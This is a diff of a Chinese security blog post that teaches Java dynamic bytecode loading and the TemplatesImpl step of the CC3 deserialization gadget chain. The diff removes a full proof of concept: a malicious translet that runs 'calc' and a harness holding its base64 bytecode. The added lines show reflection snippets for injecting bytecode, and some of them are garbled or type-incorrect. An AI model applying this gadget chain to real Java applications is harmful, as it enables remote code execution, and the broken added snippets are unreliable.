@@ -19,12 +19,12 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="一、前言在前面分析CC1和CC6利用链的时候，都是通过transform直接执行命令，但是在cc3中是通过动态类加载字节码来实现自动执行恶意类的代码。然后这里在对cc3利用链分析前，先对java动态加载字节码进行一个学习。 二、java字节码java字节码是java程序源代码经过编译器(javac)编译生成的中间代码，严格来说，它并不是本地机器代码，而是一种与平台无关的低级指令集。这些指令由jav">
+        <meta name="description" content="一、前言在前面分析CC1和CC6利用链的时候，都是通过transform之间之间执行命令，但是在cc3中是通过动态类加载来实现自动执行恶意类的代码。然后这里在对cc3利用链分析前，先对java动态加载字节码进行一个学习。 二、java字节码java字节码是java程序源代码经过编译器(javac)编译生成的中间代码，严格来说，它并不是本地机器代码，而是一种与平台无关的低级指令集。这些指令由java">
 <meta property="og:type" content="article">
 <meta property="og:title" content="java动态加载字节码">
 <meta property="og:url" content="http://example.com/2023/07/31/java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="一、前言在前面分析CC1和CC6利用链的时候，都是通过transform直接执行命令，但是在cc3中是通过动态类加载字节码来实现自动执行恶意类的代码。然后这里在对cc3利用链分析前，先对java动态加载字节码进行一个学习。 二、java字节码java字节码是java程序源代码经过编译器(javac)编译生成的中间代码，严格来说，它并不是本地机器代码，而是一种与平台无关的低级指令集。这些指令由jav">
+<meta property="og:description" content="一、前言在前面分析CC1和CC6利用链的时候，都是通过transform之间之间执行命令，但是在cc3中是通过动态类加载来实现自动执行恶意类的代码。然后这里在对cc3利用链分析前，先对java动态加载字节码进行一个学习。 二、java字节码java字节码是java程序源代码经过编译器(javac)编译生成的中间代码，严格来说，它并不是本地机器代码，而是一种与平台无关的低级指令集。这些指令由java">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731140856122.png">
 <meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731142609856.png">
@@ -36,20 +36,29 @@
 <meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731171312206.png">
 <meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731171405819.png">
 <meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731180256672.png">
-<meta property="og:image" content="c:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230731181531200.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731181531200.png">
 <meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731183014046.png">
 <meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731183214197.png">
 <meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731183356861.png">
 <meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731184214068.png">
 <meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731184353198.png">
 <meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731190017497.png">
-<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731192839333.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802171846688.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802172251738.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802175110466.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802175023651.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802175259884.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802175419393.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802180950718.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802180931720.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802181053462.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802181259643.png">
 <meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731194144950.png">
 <meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731194232897.png">
 <meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731194642542.png">
 <meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731194955697.png">
 <meta property="article:published_time" content="2023-07-31T12:49:24.000Z">
-<meta property="article:modified_time" content="2023-07-31T12:57:18.658Z">
+<meta property="article:modified_time" content="2023-08-02T12:06:28.362Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="java">
 <meta name="twitter:card" content="summary">
@@ -422,8 +431,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2023-07-31 20:57:18</span>
-            <span class="mobile">2023-07-31 20:57</span>
+            <span class="desktop">2023-08-02 20:06:28</span>
+            <span class="mobile">2023-08-02 20:06</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -445,12 +454,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>6.5k 字</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>7.3k 字</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>26 分钟</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>29 分钟</span>
         </span>
     
     
@@ -462,7 +471,7 @@
             
 
             <div class="article-content markdown-body">
-                <h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>在前面分析CC1和CC6利用链的时候，都是通过transform直接执行命令，但是在cc3中是通过动态类加载字节码来实现自动执行恶意类的代码。然后这里在对cc3利用链分析前，先对java动态加载字节码进行一个学习。</p>
+                <h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>在前面分析CC1和CC6利用链的时候，都是通过transform之间之间执行命令，但是在cc3中是通过动态类加载来实现自动执行恶意类的代码。然后这里在对cc3利用链分析前，先对java动态加载字节码进行一个学习。</p>
 <h1 id="二、java字节码"><a href="#二、java字节码" class="headerlink" title="二、java字节码"></a>二、java字节码</h1><p>java字节码是java程序源代码经过编译器(javac)编译生成的中间代码，严格来说，它并不是本地机器代码，而是一种与平台无关的低级指令集。这些指令由java虚拟机（JVM）解释执行，使得java程序可以一次编写，随处执行。使得上层开发者只需将自己的代码编译一次，就可以运行在不同平台的JVM虚拟机中。</p>
 <p>我们写的java(.java)程序通过编译器编译成的就是字节码文件(.class)。</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public class helloworld &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        System.out.println(&quot;hello,world&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
@@ -639,7 +648,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230731181531200.png"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731181531200.png"
                       alt="image-20230731181531200"
                 ></p>
 <p>虽然大多数开发者不会直接使用defineclass方法，但是在java的一些底层方法中还是有调用了defineclass的</p>
@@ -713,47 +722,144 @@
                      data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731190017497.png"
                       alt="image-20230731190017497"
                 ></p>
-<p>首先这里要求<code>_bytecodes</code>不等于NUll，等于空的话这里就直接抛出异常了</p>
-<p>继续向下分析：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">    AccessController.doPrivileged(new PrivilegedAction() &#123;</span><br><span class="line">        public Object run() &#123;</span><br><span class="line">            return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>我们这里先看一下我们要调用的defineClass()方法：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">            final int classCount = _bytecodes.length;</span><br><span class="line">            _class = new Class[classCount];</span><br><span class="line"></span><br><span class="line">            if (classCount &gt; 1) &#123;</span><br><span class="line">                _auxClasses = new HashMap&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            for (int i = 0; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                final Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                // Check if this is the main class</span><br><span class="line">                if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                else &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>
 
-<p>这里还有一个run方法：</p>
-<p>总的来说，这段代码的目的是通过特权访问控制的方式创建一个 <code>TransletClassLoader</code> 对象，并将其赋值给 <code>loader</code> 变量。</p>
-<p>而且跟进getExternalExtensionsMap方法可以发现getExternalExtensionsMap是TransformerFactoryImpl类中的方法：</p>
-<p>这里直接构造修改_tfactory的值：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br></pre></td></tr></table></figure></div>
+<p>我们在调用<code>defineclass</code>方法时还传入了一个字节数组<code>_bytecodes[i]</code></p>
+<p>那么结合前面这里这个字节数组就是我们要传入的字节码</p>
+<p>那么其实这个就是实现了遍历字节数组取出当中的字节码，然后传入defineclass进行处理</p>
+<p>但是我们不可能调用<code>defineTransletClasses()</code>就能够直接调用到<code>defineClass</code></p>
+<p>我们这里分析一下上面的代码逻辑：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (_bytecodes == null) &#123;</span><br><span class="line">    ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">    throw new TransformerConfigurationException(err.toString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
-<p>然后看调用defineClass的代码</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">        final int classCount = _bytecodes.length;</span><br><span class="line">        _class = new Class[classCount];</span><br><span class="line"></span><br><span class="line">        if (classCount &gt; 1) &#123;</span><br><span class="line">            _auxClasses = new HashMap&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            final Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">            // Check if this is the main class</span><br><span class="line">            if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            else &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
+<p>首先一个是对<code>_bytecodes</code>判断是否为空，这里的<code>_bytecodes</code>其实就是我们的字节码数组，那么我们这里把我们的字节码赋值给<code>_bytecodes</code>就可以使其不为空</p>
+<p>我们这里还是通过反射去修改属性值：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field filed = templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">filed.setAccessible(true);</span><br><span class="line">filed.set(templates, &quot;字节码&quot;);</span><br></pre></td></tr></table></figure></div>
 
-<p>这里defineclass传入了一个字节数组，所以这里传入的_bytecodes[i]就是我们在上面deifineclass中加载的字节数组</p>
-<p>构造：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;bytes&#125;);</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">    AccessController.doPrivileged(new PrivilegedAction() &#123;</span><br><span class="line">        public Object run() &#123;</span><br><span class="line">            return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></div>
 
-<p>那么分析到这里可以构造我们的POC为:</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class TemplatesImplTest &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] bytes = Base64.getDecoder().decode(&quot;base64编码的字节码&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;Sentiment&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>或者是直接加载远程或者本地class文件：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\Coding\\Java\\CC\\target\\classes\\EvilTemplatesImpl.class&quot;));</span><br><span class="line">       byte[][] codes = &#123;code&#125;;</span><br><span class="line">       setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);</span><br></pre></td></tr></table></figure></div>
 
-<p>但是这样我们直接运行是无法执行的。</p>
-<p>在P神的java安全漫谈中说:</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须</span><br><span class="line">是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类</span><br></pre></td></tr></table></figure></div>
 
-<p>所以我们这里要构造一个特殊类：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">public class HelloTemplatesImpl extends AbstractTranslet &#123;</span><br><span class="line">public void transform(DOM document, SerializationHandler[] handlers)</span><br><span class="line">throws TransletException &#123;&#125;</span><br><span class="line">public void transform(DOM document, DTMAxisIterator iterator,</span><br><span class="line">SerializationHandler handler) throws TransletException &#123;&#125;</span><br><span class="line">public HelloTemplatesImpl() &#123;</span><br><span class="line">super();</span><br><span class="line"> Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
-<p>这里编译成class文件后通过代码将字节码编码成base64格式的</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class bianma &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String filePath = &quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class\\&quot;;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            byte[] classBytes = readClassFile(filePath);</span><br><span class="line">            String base64Encoded = convertToBase64(classBytes);</span><br><span class="line">            System.out.println(base64Encoded);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static byte[] readClassFile(String filePath) throws IOException &#123;</span><br><span class="line">        try (FileInputStream fis = new FileInputStream(filePath);</span><br><span class="line">             ByteArrayOutputStream baos = new ByteArrayOutputStream()) &#123;</span><br><span class="line">            byte[] buffer = new byte[4096];</span><br><span class="line">            int bytesRead;</span><br><span class="line">            while ((bytesRead = fis.read(buffer)) != -1) &#123;</span><br><span class="line">                baos.write(buffer, 0, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line">            return baos.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static String convertToBase64(byte[] data) &#123;</span><br><span class="line">        return Base64.getEncoder().encodeToString(data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>其实效果都是一样的。</p>
+<p>然后是一个run方法</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">    AccessController.doPrivileged(new PrivilegedAction() &#123;</span><br><span class="line">        public Object run() &#123;</span><br><span class="line">            return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></div>
 
-<p>那么最终的POC就为：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class TemplatesImplTest &#123;</span><br><span class="line"> public static void main(String[] args) throws Exception &#123;</span><br><span class="line"> Templates templates = new TemplatesImpl();</span><br><span class="line">byte[] bytes = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAcDAAdAB4BAARjYWxjDAAfACABABxsZWlqaWF6YWkvSGVsbG9UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAANAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAADwALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAAQAAQAEQANABIACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);</span><br><span class="line">setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;bytes&#125;);</span><br><span class="line">setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">templates.newTransformer();</span><br><span class="line"> &#125;</span><br><span class="line">public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">field.setAccessible(true);</span><br><span class="line">field.set(obj,value);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<p>运行：</p>
+<p>这里有一个<code>_tfactory</code>，因为用到了这个参数所以我们要给这个参数赋值，不然这里就会报错</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731192839333.png"
-                      alt="image-20230731192839333"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802171846688.png"
+                      alt="image-20230802171846688"
                 ></p>
-<p>但是这里我们并没有进行newInstance()，但是依然弹出了计算器，</p>
+<p><code>transient</code> 关键字是 Java 中的一个修饰符，用于标记变量，表示该变量在对象的序列化过程中不会被持久化，即不会被写入到字节流中，从而在反序列化后该变量的值会被重新初始化。</p>
+<p>所以说我们这里给这个参数去赋值时没有意义的，因为当他在被反序列化的时候又被重新初始化了。<br>那我们直接跟进到readobject中去看一下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802172251738.png"
+                      alt="image-20230802172251738"
+                ></p>
+<p>可以看到在反序列化的时候是会给这个参数赋值的</p>
+<p>但是我们这里要使用这个参数</p>
+<p>所以我们这里可以通过反射随便给它赋值，因为无论我们赋什么值，这里在反序列化的时候的值是不会改变的</p>
+<p>然后我们这里为了方便直接赋值<code>new TransformerFactoryImpl</code>，方便我们后面调试，因为我们利用链到这里还不会进行反序列化，所以我们这里先赋值给它。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field filed = templates.getClass().getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">filed.setAccessible(true);</span><br><span class="line">filed.set(templates, &quot;new TransformerFactoryImpl&quot;);</span><br></pre></td></tr></table></figure></div>
+
+<p>然后我们这里为了简化代码，直接把反射修改属性值这一部分代码定义一个函数：</p>
